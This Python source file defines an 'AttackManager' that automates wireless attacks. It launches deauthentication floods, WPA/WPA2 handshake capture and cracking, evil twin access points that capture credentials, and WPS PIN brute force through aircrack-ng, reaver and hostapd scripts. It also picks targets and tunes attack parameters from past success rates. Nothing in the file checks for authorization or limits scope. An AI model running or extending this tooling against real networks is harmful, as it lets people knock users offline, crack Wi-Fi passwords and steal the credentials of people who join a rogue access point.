"""
Advanced Attack Manager Module
Handles sophisticated attack execution with real-world optimization and monitoring
"""

import os
import subprocess
import shlex
import logging
import psutil
import time
import threading
import json
from typing import Dict, List, Any, Tuple, Optional
import ipaddress
from datetime import datetime, timedelta
import re

class AttackManager:
    """Manages attack module execution with security and validation"""

    def __init__(self, scripts_path: str = "./scripts"):
        self.scripts_path = scripts_path
        self.logger = logging.getLogger('attack_manager')

        # Advanced attack tracking and optimization
        self.active_attacks = {}
        self.attack_history = []
        self.attack_stats = {}
        self.attack_progress = {}

        # Wireless interface management
        self.wireless_interfaces = self._discover_wireless_interfaces()
        self.current_interface = None
        self.interface_lock = threading.Lock()

        # Target intelligence and optimization
        self.target_signal_strengths = {}
        self.channel_hopping_sequence = []
        self.optimal_channels = set(range(1, 14))  # 2.4GHz channels

        # Attack optimization settings
        self.attack_optimization = {
            'auto_channel_hopping': True,
            'signal_strength_threshold': -70,
            'adaptive_timing': True,
            'progress_tracking': True,
            'intelligent_retry': True
        }

        # Enhanced attack modules with advanced features
        self.supported_modules = {
            'deauth': {
                'script': 'deauth.sh',
                'required_params': ['bssid', 'channel'],
                'optional_params': ['duration', 'packets_per_second', 'target_clients', 'smart_timing'],
                'required_tools': ['aireplay-ng', 'airmon-ng', 'iwconfig', 'iw'],
                'description': 'Advanced deauthentication attack with intelligent targeting',
                'optimization': {
                    'auto_channel_hopping': True,
                    'client_targeting': True,
                    'adaptive_packet_rate': True,
                    'signal_optimization': True
                },
                'success_metrics': ['deauth_packets_sent', 'clients_disconnected', 'reconnection_attempts']
            },
            'wpa_crack': {
                'script': 'wpa_wpa2.sh',
                'required_params': ['bssid', 'channel', 'wordlist'],
                'optional_params': ['capture_duration', 'deauth_interval', 'output_dir', 'multi_channel'],
                'required_tools': ['aireplay-ng', 'aircrack-ng', 'airmon-ng', 'airodump-ng'],
                'description': 'Intelligent WPA/WPA2 handshake capture with advanced cracking',
                'optimization': {
                    'auto_deauth_timing': True,
                    'multi_channel_capture': True,
                    'handshake_validation': True,
                    'wordlist_optimization': True
                },
                'success_metrics': ['handshake_captured', 'crack_attempts', 'password_found', 'time_to_crack']
            },
            'evil_twin': {
                'script': 'evil_twn.sh',
                'required_params': ['bssid', 'channel', 'ssid'],
                'optional_params': ['attack_duration', 'dhcp_range', 'capture_credentials', 'advanced_ssid'],
                'required_tools': ['airmon-ng', 'hostapd', 'dnsmasq', 'iw', 'iptables'],
                'description': 'Sophisticated evil twin AP with advanced credential capture',
                'optimization': {
                    'auto_ssid_generation': True,
                    'channel_conflict_detection': True,
                    'client_isolation': True,
                    'credential_capture': True
                },
                'success_metrics': ['clients_connected', 'credentials_captured', 'attack_duration', 'success_rate']
            },
            'wps': {
                'script': 'wps.sh',
                'required_params': ['bssid', 'channel'],
                'optional_params': ['attack_timeout', 'pixie_dust_mode', 'pin_database', 'brute_force'],
                'required_tools': ['reaver', 'wash', 'pixiewps'],
                'description': 'Advanced WPS PIN attack with multiple attack vectors',
                'optimization': {
                    'auto_pin_generation': True,
                    'pixie_dust_support': True,
                    'brute_force_optimization': True,
                    'timing_optimization': True
                },
                'success_metrics': ['pin_attempts', 'pin_found', 'attack_method', 'time_to_success']
            }
        }

        # Initialize optimization features
        self._initialize_attack_optimization()

    def _discover_wireless_interfaces(self) -> List[Dict[str, Any]]:
        """Discover and analyze available wireless interfaces"""
        interfaces = []

        try:
            # Get wireless interfaces using iwconfig
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)

            for line in result.stdout.split('\n'):
                if line.strip() and not line.startswith(' '):
                    interface_name = line.split()[0]
                    if interface_name and interface_name != 'lo':
                        interfaces.append({
                            'name': interface_name,
                            'type': self._get_interface_type(interface_name),
                            'capabilities': self._get_interface_capabilities(interface_name),
                            'supported_channels': self._get_supported_channels(interface_name)
                        })

        except Exception as e:
            self.logger.warning(f"Failed to discover wireless interfaces: {str(e)}")

        return interfaces

    def _get_interface_type(self, interface: str) -> str:
        """Determine interface type (managed, monitor, etc.)"""
        try:
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=5)
            if 'Mode:Monitor' in result.stdout:
                return 'monitor'
            elif 'Mode:Managed' in result.stdout:
                return 'managed'
            else:
                return 'unknown'
        except:
            return 'unknown'

    def _get_interface_capabilities(self, interface: str) -> Dict[str, Any]:
        """Get interface capabilities and features"""
        capabilities = {
            'supports_monitor': False,
            'supports_injection': False,
            'max_power': 0,
            'supported_bands': []
        }

        try:
            # Check monitor mode support
            result = subprocess.run(['iw', 'list'], capture_output=True, text=True, timeout=5)
            if interface in result.stdout:
                capabilities['supports_monitor'] = True

            # Check injection support (basic check)
            capabilities['supports_injection'] = self._test_injection_capability(interface)

        except Exception as e:
            self.logger.debug(f"Failed to get capabilities for {interface}: {str(e)}")

        return capabilities

    def _get_supported_channels(self, interface: str) -> List[int]:
        """Get list of supported channels for interface"""
        channels = []
        try:
            result = subprocess.run(['iwlist', interface, 'channel'],
                                  capture_output=True, text=True, timeout=10)

            for line in result.stdout.split('\n'):
                match = re.search(r'Channel\s+(\d+)', line)
                if match:
                    channels.append(int(match.group(1)))

        except Exception as e:
            self.logger.debug(f"Failed to get channels for {interface}: {str(e)}")

        return channels if channels else list(range(1, 14))  # Default to 2.4GHz

    def _test_injection_capability(self, interface: str) -> bool:
        """Test if interface supports packet injection"""
        try:
            # Quick test using aireplay-ng
            result = subprocess.run(['aireplay-ng', '--test', interface],
                                  capture_output=True, text=True, timeout=5)
            return 'Injection is working!' in result.stdout
        except:
            return False

    def _initialize_attack_optimization(self):
        """Initialize attack optimization features"""
        # Generate channel hopping sequence for optimal coverage
        self.channel_hopping_sequence = self._generate_optimal_channel_sequence()

        # Initialize attack statistics
        for module in self.supported_modules:
            self.attack_stats[module] = {
                'total_runs': 0,
                'success_rate': 0.0,
                'avg_duration': 0.0,
                'last_success': None,
                'optimization_hints': []
            }

    def _generate_optimal_channel_sequence(self) -> List[int]:
        """Generate optimal channel hopping sequence for 2.4GHz"""
        # Start with commonly used channels, then expand
        sequence = [1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10]
        return sequence

    def optimize_attack_parameters(self, module: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Apply intelligent parameter optimization based on attack history"""
        optimized_params = params.copy()

        if module not in self.attack_stats:
            return optimized_params

        stats = self.attack_stats[module]

        # Apply optimizations based on module type
        if module == 'deauth':
            optimized_params = self._optimize_deauth_params(optimized_params, stats)
        elif module == 'wpa_crack':
            optimized_params = self._optimize_wpa_params(optimized_params, stats)
        elif module == 'evil_twin':
            optimized_params = self._optimize_evil_twin_params(optimized_params, stats)
        elif module == 'wps':
            optimized_params = self._optimize_wps_params(optimized_params, stats)

        return optimized_params

    def _optimize_deauth_params(self, params: Dict[str, Any], stats: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize deauthentication attack parameters"""
        # Increase packet rate if previous attacks succeeded with higher rates
        if stats['success_rate'] > 0.7 and 'packets_per_second' not in params:
            params['packets_per_second'] = 50  # Higher rate for successful targets

        # Add smart timing if not specified
        if 'smart_timing' not in params:
            params['smart_timing'] = 'true'

        return params

    def _optimize_wpa_params(self, params: Dict[str, Any], stats: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize WPA cracking parameters"""
        # Extend capture duration if previous captures failed
        if stats['success_rate'] < 0.5 and 'capture_duration' not in params:
            params['capture_duration'] = 900  # 15 minutes for difficult targets

        # Enable multi-channel capture for better success
        if 'multi_channel' not in params:
            params['multi_channel'] = 'true'

        return params

    def _optimize_evil_twin_params(self, params: Dict[str, Any], stats: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize evil twin attack parameters"""
        # Generate advanced SSID if not specified
        if 'advanced_ssid' not in params:
            params['advanced_ssid'] = 'true'

        # Enable credential capture
        if 'capture_credentials' not in params:
            params['capture_credentials'] = 'true'

        return params

    def _optimize_wps_params(self, params: Dict[str, Any], stats: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize WPS attack parameters"""
        # Enable Pixie Dust if supported
        if 'pixie_dust_mode' not in params:
            params['pixie_dust_mode'] = 'true'

        # Increase timeout for difficult targets
        if stats['success_rate'] < 0.3 and 'attack_timeout' not in params:
            params['attack_timeout'] = 3600  # 1 hour for stubborn targets

        return params

    def get_attack_recommendations(self, module: str, target_info: Dict[str, Any]) -> List[str]:
        """Get intelligent attack recommendations based on target analysis"""
        recommendations = []

        if module == 'deauth':
            recommendations.extend(self._get_deauth_recommendations(target_info))
        elif module == 'wpa_crack':
            recommendations.extend(self._get_wpa_recommendations(target_info))
        elif module == 'evil_twin':
            recommendations.extend(self._get_evil_twin_recommendations(target_info))
        elif module == 'wps':
            recommendations.extend(self._get_wps_recommendations(target_info))

        return recommendations

    def _get_deauth_recommendations(self, target_info: Dict[str, Any]) -> List[str]:
        """Get deauthentication-specific recommendations"""
        recommendations = []

        # Signal strength recommendations
        signal = target_info.get('signal_strength', 0)
        if signal < -80:
            recommendations.append("Target signal is weak. Move closer or use a better antenna for better results.")
        elif signal > -50:
            recommendations.append("Excellent signal strength detected. Attack should be very effective.")

        # Client count recommendations
        client_count = target_info.get('client_count', 0)
        if client_count == 0:
            recommendations.append("No clients detected. Deauth will only work if clients connect during attack.")
        elif client_count > 10:
            recommendations.append("Many clients detected. Consider targeting specific clients for better results.")

        return recommendations

    def _get_wpa_recommendations(self, target_info: Dict[str, Any]) -> List[str]:
        """Get WPA cracking recommendations"""
        recommendations = []

        # Wordlist recommendations
        wordlist_path = target_info.get('wordlist')
        if wordlist_path:
            try:
                wordlist_size = os.path.getsize(wordlist_path) / (1024 * 1024)  # MB
                if wordlist_size < 10:
                    recommendations.append("Small wordlist detected. Consider using a larger wordlist for better success rate.")
                elif wordlist_size > 1000:
                    recommendations.append("Very large wordlist. This may take significant time to process.")
            except:
                pass

        # Security recommendations
        encryption = target_info.get('encryption', '').upper()
        if 'WPA3' in encryption:
            recommendations.append("WPA3 detected. Cracking may be significantly more difficult.")
        elif 'WPA2' in encryption:
            recommendations.append("WPA2 detected. Good candidate for handshake capture and cracking.")

        return recommendations

    def _get_evil_twin_recommendations(self, target_info: Dict[str, Any]) -> List[str]:
        """Get evil twin attack recommendations"""
        recommendations = []

        # Channel conflict detection
        channel = target_info.get('channel', 0)
        if channel in [1, 6, 11]:
            recommendations.append("Target is on a commonly used channel. Evil twin may attract unintended clients.")
        else:
            recommendations.append("Target is on less common channel. Evil twin should have fewer conflicts.")

        # Client activity recommendations
        client_count = target_info.get('client_count', 0)
        if client_count > 5:
            recommendations.append("Many active clients detected. Evil twin attack should be very effective.")

        return recommendations

    def _get_wps_recommendations(self, target_info: Dict[str, Any]) -> List[str]:
        """Get WPS attack recommendations"""
        recommendations = []

        # WPS vulnerability assessment
        if target_info.get('wps_enabled', False):
            recommendations.append("WPS is enabled on target. Good candidate for WPS attacks.")
        else:
            recommendations.append("WPS does not appear to be enabled. WPS attacks will not work.")

        # PIN attempt recommendations
        if target_info.get('wps_locked', False):
            recommendations.append("WPS is locked due to previous failed attempts. Wait before retrying.")

        return recommendations

    def _select_optimal_interface(self, module: str, params: Dict[str, Any]) -> Optional[str]:
        """Select the best wireless interface for the attack"""
        with self.interface_lock:
            if not self.wireless_interfaces:
                return None

            # For attacks requiring monitor mode
            if module in ['deauth', 'wpa_crack', 'wps']:
                # Prefer interfaces that support injection
                injection_interfaces = [
                    iface for iface in self.wireless_interfaces
                    if iface['capabilities'].get('supports_injection', False)
                ]

                if injection_interfaces:
                    # Select interface with best signal if target info available
                    target_channel = params.get('channel')
                    if target_channel:
                        for iface in injection_interfaces:
                            if int(target_channel) in iface.get('supported_channels', []):
                                return iface['name']

                    # Return first injection-capable interface
                    return injection_interfaces[0]['name']

            # For evil twin (needs AP mode)
            elif module == 'evil_twin':
                # Prefer interfaces that support AP mode
                ap_interfaces = [
                    iface for iface in self.wireless_interfaces
                    if iface['type'] == 'managed'  # Can be converted to AP mode
                ]

                if ap_interfaces:
                    return ap_interfaces[0]['name']

            # Return first available interface as fallback
            return self.wireless_interfaces[0]['name'] if self.wireless_interfaces else None

    def _monitor_attack_progress(self, attack_id: str, process: subprocess.Popen):
        """Monitor attack progress and update statistics"""
        try:
            while attack_id in self.active_attacks:
                if process.poll() is not None:
                    # Process finished
                    self._finalize_attack(attack_id, process.returncode)
                    break

                # Update progress information
                if attack_id in self.attack_progress:
                    self.attack_progress[attack_id]['runtime'] = (
                        datetime.now() - self.attack_progress[attack_id]['start_time']
                    ).total_seconds()

                time.sleep(1)

        except Exception as e:
            self.logger.error(f"Error monitoring attack {attack_id}: {str(e)}")

    def _finalize_attack(self, attack_id: str, return_code: int):
        """Finalize attack execution and update statistics"""
        if attack_id not in self.active_attacks:
            return

        attack_info = self.active_attacks[attack_id]
        module = attack_info['module']

        # Calculate duration
        duration = (datetime.now() - attack_info['start_time']).total_seconds()

        # Determine success based on return code and module-specific logic
        success = return_code == 0

        # Update attack statistics
        if module in self.attack_stats:
            stats = self.attack_stats[module]
            stats['total_runs'] += 1

            # Update success rate
            total_runs = stats['total_runs']
            if success:
                stats['success_rate'] = ((stats['success_rate'] * (total_runs - 1)) + 1) / total_runs
                stats['last_success'] = datetime.now()
            else:
                stats['success_rate'] = (stats['success_rate'] * (total_runs - 1)) / total_runs

            # Update average duration
            stats['avg_duration'] = ((stats['avg_duration'] * (total_runs - 1)) + duration) / total_runs

        # Update progress
        if attack_id in self.attack_progress:
            self.attack_progress[attack_id].update({
                'status': 'completed' if success else 'failed',
                'end_time': datetime.now(),
                'duration': duration,
                'return_code': return_code,
                'success': success
            })

        # Add to history
        self.attack_history.append({
            'attack_id': attack_id,
            'module': module,
            'start_time': attack_info['start_time'],
            'duration': duration,
            'success': success,
            'params': attack_info['params'],
            'return_code': return_code
        })

        # Keep only last 100 attacks in history
        if len(self.attack_history) > 100:
            self.attack_history = self.attack_history[-100:]

        # Clean up
        del self.active_attacks[attack_id]

        self.logger.info(f"Attack {attack_id} finalized - Success: {success}, Duration: {duration:.2f}s")

    def get_attack_progress(self, attack_id: str) -> Optional[Dict[str, Any]]:
        """Get real-time progress of a specific attack"""
        return self.attack_progress.get(attack_id)

    def get_attack_analytics(self) -> Dict[str, Any]:
        """Get comprehensive attack analytics"""
        analytics = {
            'total_attacks': len(self.attack_history),
            'active_attacks': len(self.active_attacks),
            'module_stats': {},
            'recent_attacks': self.attack_history[-10:],  # Last 10 attacks
            'success_trends': {},
            'optimization_effectiveness': {}
        }

        # Calculate module-specific statistics
        for module in self.supported_modules:
            if module in self.attack_stats:
                stats = self.attack_stats[module]
                analytics['module_stats'][module] = {
                    'total_runs': stats['total_runs'],
                    'success_rate': round(stats['success_rate'] * 100, 2),
                    'avg_duration': round(stats['avg_duration'], 2),
                    'last_success': stats['last_success'].isoformat() if stats['last_success'] else None
                }

        # Calculate success trends (last 24 hours)
        one_day_ago = datetime.now() - timedelta(days=1)
        recent_attacks = [a for a in self.attack_history if a['start_time'] > one_day_ago]

        analytics['success_trends']['last_24h'] = {
            'total': len(recent_attacks),
            'successful': len([a for a in recent_attacks if a['success']]),
            'avg_duration': sum(a['duration'] for a in recent_attacks) / len(recent_attacks) if recent_attacks else 0
        }

        return analytics

    def get_smart_suggestions(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Get intelligent attack suggestions based on target analysis"""
        suggestions = []

        # Analyze target characteristics
        bssid = target_info.get('bssid', '')
        channel = target_info.get('channel', 0)
        signal_strength = target_info.get('signal_strength', 0)
        encryption = target_info.get('encryption', '').upper()
        client_count = target_info.get('client_count', 0)

        # WPA/WPA2 cracking suggestions
        if 'WPA' in encryption:
            suggestions.append({
                'module': 'wpa_crack',
                'priority': 'high' if client_count > 0 else 'medium',
                'reason': f"WPA network detected with {client_count} clients",
                'estimated_success': 'medium',
                'recommended_params': {
                    'capture_duration': 600 if client_count == 0 else 300,
                    'deauth_interval': 30
                }
            })

        # WPS attack suggestions
        if target_info.get('wps_enabled', False):
            suggestions.append({
                'module': 'wps',
                'priority': 'high',
                'reason': 'WPS is enabled on target',
                'estimated_success': 'high',
                'recommended_params': {
                    'attack_timeout': 1800,
                    'pixie_dust_mode': 'true'
                }
            })

        # Evil twin suggestions for public networks
        if 'OPEN' in encryption or client_count > 3:
            suggestions.append({
                'module': 'evil_twin',
                'priority': 'medium',
                'reason': f"Open network or high client count ({client_count})",
                'estimated_success': 'high',
                'recommended_params': {
                    'attack_duration': 1800,
                    'capture_credentials': 'true'
                }
            })

        # Deauth suggestions
        if client_count > 0:
            suggestions.append({
                'module': 'deauth',
                'priority': 'high',
                'reason': f"{client_count} clients connected to target",
                'estimated_success': 'very_high',
                'recommended_params': {
                    'duration': 300,
                    'packets_per_second': 50
                }
            })

        # Sort by priority
        priority_order = {'very_high': 0, 'high': 1, 'medium': 2, 'low': 3}
        suggestions.sort(key=lambda x: priority_order.get(x['priority'], 3))

        return suggestions[:3]  # Return top 3 suggestions

    def get_required_params(self, module: str) -> List[str]:
        """Get required parameters for a module"""
        if module in self.supported_modules:
            return self.supported_modules[module]['required_params']
        return []

    def validate_parameters(self, module: str, params: Dict[str, Any]) -> Tuple[bool, str]:
        """Validate attack parameters"""
        if module not in self.supported_modules:
            return False, f"Unsupported module: {module}"

        module_config = self.supported_modules[module]
        required_params = module_config['required_params']

        # Check for missing parameters
        missing = [param for param in required_params if param not in params]
        if missing:
            return False, f"Missing required parameters: {', '.join(missing)}"

        # Validate parameter values
        for param, value in params.items():
            if not isinstance(value, str) or not value.strip():
                return False, f"Invalid parameter value for {param}"

            # Specific validations
            if param == 'bssid':
                if not self._is_valid_mac(value):
                    return False, f"Invalid BSSID format: {value}"
            elif param == 'channel':
                if not self._is_valid_channel(value):
                    return False, f"Invalid channel: {value}"
            elif param == 'wordlist':
                if not os.path.isfile(value):
                    return False, f"Wordlist file not found: {value}"

        return True, "Parameters validated successfully"

    def _is_valid_mac(self, mac: str) -> bool:
        """Validate MAC address format"""
        import re
        return bool(re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac))

    def _is_valid_channel(self, channel: str) -> bool:
        """Validate WiFi channel"""
        try:
            ch = int(channel)
            return 1 <= ch <= 165  # Valid WiFi channels
        except ValueError:
            return False

    def check_tools_availability(self, module: str) -> Tuple[bool, str]:
        """Check if required tools are available"""
        if module not in self.supported_modules:
            return False, f"Unknown module: {module}"

        required_tools = self.supported_modules[module]['required_tools']
        missing_tools = []

        for tool in required_tools:
            if not self._is_tool_available(tool):
                missing_tools.append(tool)

        if missing_tools:
            return False, f"Required tools not found: {', '.join(missing_tools)}"

        return True, "All required tools are available"

    def _is_tool_available(self, tool: str) -> bool:
        """Check if a tool is available in PATH"""
        try:
            subprocess.run([tool, '--version'],
                         capture_output=True,
                         check=True,
                         timeout=5)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def execute_attack(self, module: str, params: Dict[str, Any], target_info: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute an attack module with advanced optimization and monitoring"""
        start_time = datetime.now()

        try:
            # Validate parameters
            valid, error_msg = self.validate_parameters(module, params)
            if not valid:
                return {'success': False, 'error': error_msg}

            # Check tool availability
            tools_ok, tool_error = self.check_tools_availability(module)
            if not tools_ok:
                return {'success': False, 'error': tool_error}

            # Get intelligent recommendations
            recommendations = []
            if target_info:
                recommendations = self.get_attack_recommendations(module, target_info)

            # Apply parameter optimization
            optimized_params = self.optimize_attack_parameters(module, params)

            # Select best wireless interface
            interface = self._select_optimal_interface(module, optimized_params)
            if interface:
                optimized_params['interface'] = interface

            # Get script configuration
            module_config = self.supported_modules[module]
            script_name = module_config['script']
            script_path = os.path.join(self.scripts_path, script_name)

            # Validate script exists and is executable
            if not os.path.isfile(script_path):
                return {'success': False, 'error': f"Script not found: {script_name}"}

            if not os.access(script_path, os.X_OK):
                return {'success': False, 'error': f"Script not executable: {script_name}"}

            # Prepare command with optimized arguments
            required_params = module_config['required_params']
            args = [optimized_params[param] for param in required_params]

            # Add optional parameters if provided
            optional_params = module_config.get('optional_params', [])
            for opt_param in optional_params:
                if opt_param in optimized_params:
                    args.append(optimized_params[opt_param])

            # Sanitize all arguments
            sanitized_args = [shlex.quote(str(arg)) for arg in args]
            command = [script_path] + sanitized_args

            self.logger.info(f"Executing optimized attack: {module}")
            self.logger.info(f"Command: {' '.join(command)}")
            self.logger.info(f"Optimizations applied: {list(set(optimized_params.keys()) - set(params.keys()))}")

            # Initialize progress tracking
            attack_id = f"{module}_{int(time.time())}"
            self.attack_progress[attack_id] = {
                'status': 'starting',
                'start_time': start_time,
                'module': module,
                'target': params.get('bssid', 'unknown'),
                'recommendations': recommendations,
                'optimizations': list(set(optimized_params.keys()) - set(params.keys()))
            }

            # Execute the attack script with monitoring
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=self.scripts_path
            )

            # Track active attack
            self.active_attacks[attack_id] = {
                'pid': process.pid,
                'process': process,
                'module': module,
                'start_time': start_time,
                'params': optimized_params,
                'target_info': target_info,
                'progress_id': attack_id
            }

            # Update progress
            self.attack_progress[attack_id]['status'] = 'running'
            self.attack_progress[attack_id]['pid'] = process.pid

            # Start background monitoring
            monitoring_thread = threading.Thread(
                target=self._monitor_attack_progress,
                args=(attack_id, process),
                daemon=True
            )
            monitoring_thread.start()

            self.logger.info(f"Attack {attack_id} started with PID {process.pid}")

            return {
                'success': True,
                'message': f"{module} attack started with optimizations",
                'attack_id': attack_id,
                'pid': process.pid,
                'module': module,
                'optimizations_applied': list(set(optimized_params.keys()) - set(params.keys())),
                'recommendations': recommendations
            }

        except Exception as e:
            self.logger.error(f"Failed to execute attack {module}: {str(e)}")

            # Record failed attempt
            if module in self.attack_stats:
                self.attack_stats[module]['total_runs'] += 1

            return {'success': False, 'error': f"Execution failed: {str(e)}"}

    def get_running_attacks(self) -> List[Dict[str, Any]]:
        """Get information about currently running attack processes"""
        running_attacks = []

        try:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    cmdline = proc.info['cmdline']
                    if cmdline and len(cmdline) > 0:
                        cmd = cmdline[0]
                        if any(script in cmd for script in ['deauth.sh', 'wpa_wpa2.sh', 'evil_twn.sh', 'wps.sh']):
                            running_attacks.append({
                                'pid': proc.info['pid'],
                                'script': os.path.basename(cmd),
                                'command': ' '.join(cmdline)
                            })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception as e:
            self.logger.error(f"Error getting running attacks: {str(e)}")

        return running_attacks

    def stop_attack(self, pid: int) -> bool:
        """Stop a running attack process"""
        try:
            process = psutil.Process(pid)
            process.terminate()
            process.wait(timeout=5)
            return True
        except (psutil.NoSuchProcess, psutil.TimeoutExpired):
            try:
                process.kill()  # Force kill if terminate fails
                return True
            except psutil.NoSuchProcess:
                return False
        except Exception as e:
            self.logger.error(f"Failed to stop attack process {pid}: {str(e)}")
            return False

    def get_attack_status(self) -> Dict[str, Any]:
        """Get overall attack system status"""
        return {
            'supported_modules': list(self.supported_modules.keys()),
            'running_attacks': self.get_running_attacks(),
            'available_tools': {
                tool: self._is_tool_available(tool)
                for module in self.supported_modules.values()
                for tool in module['required_tools']
            }
        }
